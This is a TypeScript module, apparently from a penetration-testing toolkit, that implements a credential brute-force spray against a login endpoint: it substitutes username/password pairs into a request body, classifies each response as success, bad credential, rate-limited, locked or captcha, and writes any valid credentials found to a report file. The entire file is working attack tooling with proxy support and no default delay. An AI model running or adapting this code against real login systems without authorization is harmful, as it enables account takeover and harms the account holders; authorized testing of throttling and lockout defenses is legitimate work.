import { fetchUrl } from "../adapters/http.js";
import { writeArtifact } from "../adapters/artifacts.js";

/** Credential brute-force surface: bounded dictionary spray against a login
 *  endpoint with per-response semantic classification (auth-ok / bad-cred /
 *  rate-limited / locked / captcha). Detects valid credentials by response
 *  divergence and measures throttle presence across the run. */

export interface CredInput {
  readonly url: string;
  readonly bodyTemplate: string;
  readonly outputRoot: string;
  /** candidate credentials: [{user, pass}] — bounded to maxPairs */
  readonly pairs: readonly { user: string; pass: string }[];
  readonly maxPairs?: number;
  readonly cookie?: string;
  readonly headers?: Record<string, string>;
  readonly proxy?: string;
  readonly timeoutMs?: number;
  /** delay ms between attempts (default 0) */
  readonly delayMs?: number;
}
export interface CredCase {
  readonly user: string;
  readonly pass: string;
  readonly status: number;
  readonly semantic: "auth-ok" | "bad-cred" | "rate-limited" | "locked" | "captcha" | "error" | "unknown";
  readonly ms: number;
  readonly bodyPrefix: string;
}
export interface CredResult {
  readonly tried: number;
  readonly valid: CredCase[];
  readonly semantics: Record<string, number>;
  readonly throttled: boolean;
  readonly cases: CredCase[];
  readonly artifacts: { path: string; bytes: number }[];
}

const classify = (status: number, body: string): CredCase["semantic"] => {
  const b = body.slice(0, 600).toLowerCase();
  if (status === 429) return "rate-limited";
  if (/locked|suspended|temporarily blocked/.test(b)) return "locked";
  if (/captcha|challenge|verification required/.test(b)) return "captcha";
  if (status >= 200 && status < 300 && /token|authentication|jwt|set-cookie|sessionid|authenticated/.test(b)) return "auth-ok";
  if (status === 401 || status === 403 || /invalid|wrong|incorrect|failed|denied|no match|not found/.test(b)) return "bad-cred";
  if (status === 0) return "error";
  if (status >= 500) return "error";
  return "unknown";
};

export const probeCredBrute = async (input: CredInput): Promise<CredResult> => {
  const pairs = input.pairs.slice(0, input.maxPairs ?? 200);
  const cases: CredCase[] = [];
  const valid: CredCase[] = [];
  for (const p of pairs) {
    const body = input.bodyTemplate.replaceAll("{USER}", p.user).replaceAll("{PASS}", p.pass);
    const t0 = Date.now();
    let status = 0; let bodyStr = "";
    try {
      const r = await fetchUrl(input.url, { method: "POST", body, cookie: input.cookie, headers: { "content-type": "application/json", ...(input.headers ?? {}) }, proxy: input.proxy, timeoutMs: input.timeoutMs ?? 10000, maxAttempts: 1 });
      status = r.status; bodyStr = r.body;
    } catch { /* transport */ }
    const c: CredCase = { user: p.user, pass: p.pass, status, semantic: classify(status, bodyStr), ms: Date.now() - t0, bodyPrefix: bodyStr.slice(0, 80) };
    cases.push(c);
    if (c.semantic === "auth-ok") valid.push(c);
    if (input.delayMs && input.delayMs > 0) await new Promise(r => setTimeout(r, input.delayMs));
  }
  const semantics: Record<string, number> = {};
  for (const c of cases) semantics[c.semantic] = (semantics[c.semantic] ?? 0) + 1;
  const throttled = (semantics["rate-limited"] ?? 0) + (semantics["locked"] ?? 0) + (semantics["captcha"] ?? 0) > 0;
  const artifacts = [
    await writeArtifact(input.outputRoot, "cred_cases.json", JSON.stringify(cases, null, 2)),
    await writeArtifact(input.outputRoot, "cred_brute.md", ["# Credential brute-force", "", `tried: ${cases.length}, valid: ${valid.length}, throttled: ${throttled}`, "", ...valid.map(v => `- **VALID ${v.user} / ${v.pass}** (${v.status}, ${v.ms}ms)`)].join("\n")),
  ];
  return { tried: cases.length, valid, semantics, throttled, cases, artifacts };
};
